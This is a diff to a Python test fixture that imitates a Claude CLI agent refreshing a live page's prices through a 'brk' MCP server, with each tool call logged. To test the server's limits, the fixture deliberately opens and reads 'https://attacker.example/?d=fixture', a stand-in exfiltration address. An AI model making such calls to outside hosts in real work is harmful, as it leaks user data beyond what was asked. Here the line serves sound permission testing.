@@ -89,6 +89,48 @@ def hang_ignoring_term():
     signal.signal(signal.SIGTERM, signal.SIG_IGN)
     while True: time.sleep(1)
 
+def refresh_live_page(prompt):
+    """A live page's refresh (BRK_LIVE_REFRESH), the way an agent with only Brk's MCP server does it: list the tools, try
+    what a refresh may not do, read each source, write the prices it finds. Each call and its answer go to the log."""
+    config = json.loads(sys.argv[sys.argv.index('--mcp-config') + 1])['mcpServers']['brk']
+    server = subprocess.Popen([config['command']] + config['args'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+    ids = {'n': 0}
+    def rpc(method, params=None):
+        ids['n'] += 1
+        server.stdin.write(json.dumps({'jsonrpc': '2.0', 'id': ids['n'], 'method': method, 'params': params or {}}) + '\n'); server.stdin.flush()
+        while True:
+            line = server.stdout.readline()
+            if not line: return {}
+            reply = json.loads(line)
+            if reply.get('id') == ids['n']: return reply.get('result') or {'error': reply.get('error')}
+    def call(name, arguments):
+        result = rpc('tools/call', {'name': name, 'arguments': arguments})
+        text = (result.get('content') or [{}])[0].get('text', '')
+        record = {'refresh': name, 'arguments': arguments, 'isError': result.get('isError', False), 'text': text[:300]}
+        if path := os.environ.get('BRK_AI_FIXTURE_LOG'):
+            with open(path, 'a') as f: f.write(json.dumps(record) + '\n')
+        try: return result.get('isError', False), json.loads(text)
+        except Exception: return True, {}
+    rpc('initialize', {'protocolVersion': '2025-06-18', 'capabilities': {}, 'clientInfo': {'name': 'fixture', 'version': '1'}})
+    listed = [tool['name'] for tool in rpc('tools/list').get('tools', [])]
+    if path := os.environ.get('BRK_AI_FIXTURE_LOG'):
+        with open(path, 'a') as f: f.write(json.dumps({'refreshTools': listed, 'argv': sys.argv[1:]}) + '\n')
+    # What a refresh may not do: open a tab, read an address the page did not list.
+    call('brk_tab_open', {'url': 'https://attacker.example/?d=fixture'})
+    call('brk_page_source_read', {'url': 'https://attacker.example/?d=fixture'})
+    sources = [line[2:].strip() for line in prompt.splitlines() if line.startswith('- http')]
+    current = prompt.split('The data now:\n', 1)[1].split('\n\n', 1)[0] if 'The data now:\n' in prompt else 'null'
+    data = json.loads(current) if current.strip() != 'null' else {'items': []}
+    for source in sources:
+        failed, read = call('brk_page_source_read', {'url': source, 'maxChars': 2000})
+        if failed: continue
+        found = re.search(r'€\s?(\d+[.,]\d\d)', read.get('text', ''))
+        for item in data.get('items', []):
+            if item.get('url') == source and found: item['price'] = float(found.group(1).replace(',', '.'))
+    failed, _ = call('brk_page_update_data', {'data': data})
+    put({'type': 'stream_event', 'parent_tool_use_id': None, 'event': {'type': 'content_block_delta', 'delta': {'type': 'text_delta', 'text': 'Refreshed the prices.' if not failed else 'Could not refresh.'}}})
+    server.stdin.close(); server.wait(timeout=5)
+
 def claude():
     tools = '--permission-prompt-tool' in sys.argv
     session = 'fixture-session-' + str(os.getpid())
@@ -109,6 +151,11 @@ def claude():
             put({'type': 'assistant', 'parent_tool_use_id': None, 'message': {'content': [{'type': 'tool_use', 'id': 'toolu_so', 'name': 'StructuredOutput', 'input': obj}]}})
             put({'type': 'result', 'subtype': 'success', 'is_error': False, 'result': json.dumps(obj), 'structured_output': obj, 'session_id': session,
                  'usage': {'input_tokens': 2, 'cache_creation_input_tokens': 100, 'cache_read_input_tokens': 50, 'output_tokens': 20}})
+            return
+        if prompt.startswith('BRK_LIVE_REFRESH') and '--mcp-config' in sys.argv:
+            refresh_live_page(prompt)
+            put({'type': 'result', 'subtype': 'success', 'is_error': False, 'result': None, 'session_id': session, 'num_turns': 3,
+                 'usage': {'input_tokens': 900, 'cache_creation_input_tokens': 0, 'cache_read_input_tokens': 300, 'output_tokens': 40}})
             return
         if prompt == 'fixture:stream':
             text('first\n'); time.sleep(2); text('second\n'); result('first\nsecond\n')
